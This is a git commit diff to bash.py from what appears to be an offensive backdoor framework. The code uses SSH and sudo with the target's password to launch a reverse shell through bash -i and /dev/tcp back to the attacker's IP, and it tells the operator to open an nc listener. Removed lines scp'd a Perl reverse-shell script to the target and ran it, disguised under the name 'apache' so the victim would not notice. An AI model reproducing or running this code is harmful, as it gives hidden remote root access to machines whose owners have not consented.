cb768d35b3397c7344cb5f2ec6ab6d4ea3e2580c
George Hughey <ghughey@umd.edu>
2015-12-25 23:09:38 -0800

    Added a few updates to bash.

--- bash.py
+++ bash.py
@@ -30,28 +30,7 @@ class Bash(Backdoor):
         port = self.get_value("port")
 
         print(GOOD + "Initializing backdoor...")
-        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % port)
+	raw_input("Please create a listener with the command nc -v -n -l -p " + str(port))
+	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % port)
         print(GOOD + "Bash Backdoor on port %s attempted. You may need to input the password, which is " + self.target.pword)
-
-
-        toW = 'perl/prsA.pl'
-        stringToAdd = ""
-        fileToWrite = open(toW, 'w')
-
-        with open ("perl/prs1", "r") as myfile:
-            data=myfile.read()
-        data = data[:-1]#remove the last new line character.
-        stringToAdd+=data + self.core.localIP
-
-        with open ("perl/prs2", "r") as myfile:
-            data=myfile.read()
-        stringToAdd+=data
-        fileToWrite.write(stringToAdd)
-        fileToWrite.close()
-
-        raw_input("Run the following command: nc -v -n -l -p %s in another shell to start the listener." % port)
-        self.target.scpFiles(self, 'perl/prsA.pl', False)
-        print("Moving the backdoor script.")
-        self.target.ssh.exec_command(self.command)
-        print("Bash backdoor on port %s attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop." % port)
 
